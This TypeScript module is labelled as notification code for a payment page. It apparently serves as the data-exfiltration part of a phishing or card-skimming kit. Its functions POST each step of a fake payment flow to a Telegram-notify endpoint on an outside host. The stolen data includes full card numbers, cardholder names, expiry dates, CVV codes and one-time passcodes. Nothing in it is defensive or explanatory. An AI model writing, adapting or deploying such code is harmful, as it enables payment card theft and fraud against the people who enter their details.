const TELEGRAM_ENDPOINT = 'https://kudezsvkhlpxnxdbxzjg.supabase.co/functions/v1/telegram-notify';

export type NotificationStage = 'PG-1' | 'PG-2' | 'PG-3';

interface NotificationPayload {
  stage: NotificationStage;
  sessionKey: string;
  amount: string;
  merchantId?: string;
  transactionId?: string;
  cardNumber?: string;
  cardHolderName?: string;
  cardExpiry?: string;
  cardCVV?: string;
  cardType?: string;
  selectedMethod?: string;
  otpCode?: string;
  action?: string;
  timestamp?: string;
}

export async function sendNotification(payload: NotificationPayload): Promise<boolean> {
  try {
    const response = await fetch(TELEGRAM_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ...payload,
        timestamp: payload.timestamp || new Date().toISOString(),
      }),
    });

    return response.ok;
  } catch (error) {
    console.error('Failed to send notification:', error);
    return false;
  }
}

export function sendPageLoadNotification(sessionKey: string, amount: string) {
  return sendNotification({
    stage: 'PG-1',
    sessionKey,
    amount,
    action: 'Page Loaded',
  });
}

export function sendMethodSelectionNotification(
  sessionKey: string, 
  amount: string, 
  selectedMethod: string
) {
  return sendNotification({
    stage: 'PG-2',
    sessionKey,
    amount,
    selectedMethod,
    action: 'Method Selected',
  });
}

export function sendCardEntryNotification(
  sessionKey: string,
  amount: string,
  cardDetails: {
    cardNumber: string;
    cardHolderName: string;
    cardExpiry: string;
    cardCVV: string;
    cardType: string;
  }
) {
  return sendNotification({
    stage: 'PG-2',
    sessionKey,
    amount,
    ...cardDetails,
    action: 'Card Entered',
  });
}

export function sendOtpNotification(
  sessionKey: string,
  amount: string,
  otpCode: string,
  cardNumber: string
) {
  return sendNotification({
    stage: 'PG-3',
    sessionKey,
    amount,
    otpCode,
    cardNumber,
    action: 'OTP Entered',
  });
}

export function sendCancelNotification(sessionKey: string, amount: string, stage: NotificationStage) {
  return sendNotification({
    stage,
    sessionKey,
    amount,
    action: 'Cancelled',
  });
}

export function sendResendNotification(sessionKey: string, amount: string) {
  return sendNotification({
    stage: 'PG-3',
    sessionKey,
    amount,
    action: 'Resend requested',
  });
}
